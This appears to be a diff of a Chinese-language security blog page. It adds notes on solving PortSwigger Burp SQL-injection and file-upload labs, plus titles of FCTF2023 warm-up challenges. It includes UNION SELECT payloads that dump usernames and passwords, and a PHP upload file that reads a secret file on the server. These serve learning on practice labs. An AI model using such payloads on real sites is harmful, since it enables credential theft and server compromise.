@@ -66,8 +66,8 @@
   
     <article id="post-aaaa" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2023/04/18/aaaa/" class="article-date">
-  <time datetime="2023-04-18T12:05:50.000Z" itemprop="datePublished">2023-04-18</time>
+    <a href="/2023/04/26/aaaa/" class="article-date">
+  <time datetime="2023-04-26T12:05:50.000Z" itemprop="datePublished">2023-04-26</time>
 </a>
     
   </div>
@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/18/aaaa/">2023/04/15：burplabs从0开始</a>
+      <a class="article-title" href="/2023/04/26/aaaa/">2023/04/15：burplabs从0开始</a>
     </h1>
   
 
@@ -86,22 +86,30 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>这里的题目看起来更像真实的场景<br>可惜有点卡，下面的解答视频有一种没带眼镜的美</p>
+        <p>这里的题目看起来更像真实的场景<br>可惜有点卡，下面的解答视频有一种没带眼镜的美<br>有完整教程，很行</p>
 <h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="apprentice"><a href="#apprentice" class="headerlink" title="apprentice"></a>apprentice</h3><p>开网页的时间比写还久（恼）</p>
 <h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>第一题为get注入 单引号闭合然后1=1就完事了<br>有点卡反应比较慢</p>
-<img src="/2023/04/18/aaaa/lab1.png" class="">
+<img src="/2023/04/26/aaaa/lab1.png" class="">
 <h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>简单的万能密码，啥过滤也没有</p>
-<img src="/2023/04/18/aaaa/lab2.png" class="">
+<img src="/2023/04/26/aaaa/lab2.png" class="">
 <h3 id="practitoner"><a href="#practitoner" class="headerlink" title="practitoner"></a>practitoner</h3><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>联合查询第一步，column的数量</p>
-<img src="/2023/04/18/aaaa/lab3.png" class="">
+<img src="/2023/04/26/aaaa/lab3.png" class="">
 <p>一直用null测出数量</p>
 <h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>union select，找到指定column，把上一题的一个null替换即可</p>
-<h4 id="4-5"><a href="#4-5" class="headerlink" title="4.5"></a>4.5</h4><p>burp内有教程，但是全英文属实有点难受<br>但想到之前sql注入总是因为语句不合适失败还是先硬着头皮看完吧</p>
-<h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4>
+<h4 id="4-5"><a href="#4-5" class="headerlink" title="4.5"></a>4.5</h4><p>burp内有教程，但是全英文属实有点难受<br>但想到之前sql注入总是因为语句不合适失败还是先硬着头皮边看边写吧</p>
+<h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>get传参的联合注入，直接在地址栏注就行：’+UNION+SELECT+username,+password+FROM+users–<br>回显在下面文章标题（？）那里，感觉很奇怪好像也很合理</p>
+<h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="string">&#x27; UNION SELECT username || &#x27;</span>~<span class="string">&#x27; || password FROM users--</span></span><br></pre></td></tr></table></figure>
+<p>emm大概是一种联合查询技巧以便更好的得到所需数据吧</p>
+<h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><h2 id="File-upload"><a href="#File-upload" class="headerlink" title="File upload"></a>File upload</h2><p>文件上传复习</p>
+<h3 id="apprentice-1"><a href="#apprentice-1" class="headerlink" title="apprentice"></a>apprentice</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>用php文件，写上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ &lt;?php </span><br><span class="line"> <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;/home/carlos/secret&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>把这个文件在上传头像的地方上传，然后右键在新网页打开头像即可</p>
+<p>这个是github上找的方法比官方给的省事<br>可能因为网络问题用官方改数据包的方式很可能失败</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/04/18/aaaa/" data-id="clgmd2nyv00002oud4yao5c83" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/04/26/aaaa/" data-id="clgmd2nyv00002oud4yao5c83" class="article-share-link">Share</a>
       
       
     </footer>
@@ -113,8 +121,8 @@
   
     <article id="post-warmup" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2023/04/18/warmup/" class="article-date">
-  <time datetime="2023-04-18T08:08:35.000Z" itemprop="datePublished">2023-04-18</time>
+    <a href="/2023/04/26/warmup/" class="article-date">
+  <time datetime="2023-04-26T08:08:35.000Z" itemprop="datePublished">2023-04-26</time>
 </a>
     
   </div>
@@ -125,7 +133,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/18/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
+      <a class="article-title" href="/2023/04/26/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
     </h1>
   
 
@@ -134,11 +142,14 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>无所谓会不会，主要是图一乐<br>又菜又爱玩才能进步</p>
-<h4 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h4><h4 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h4>
+<h4 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h4><h5 id="viewsource"><a href="#viewsource" class="headerlink" title="viewsource"></a>viewsource</h5><p>没啥好说的，F12</p>
+<h5 id="filechecker"><a href="#filechecker" class="headerlink" title="filechecker"></a>filechecker</h5><p>先再次复习下再继续</p>
+<h5 id="javadeserialize"><a href="#javadeserialize" class="headerlink" title="javadeserialize"></a>javadeserialize</h5><p>emm这个折腾的有点久有点问题，先看完别的吧</p>
+<h4 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h4>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/04/18/warmup/" data-id="clgmd2nz000012oud7h4f1jo9" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/04/26/warmup/" data-id="clgmd2nz000012oud7h4f1jo9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -491,11 +502,11 @@
       <ul>
         
           <li>
-            <a href="/2023/04/18/aaaa/">2023/04/15：burplabs从0开始</a>
+            <a href="/2023/04/26/aaaa/">2023/04/15：burplabs从0开始</a>
           </li>
         
           <li>
-            <a href="/2023/04/18/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
+            <a href="/2023/04/26/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
           </li>
         
           <li>
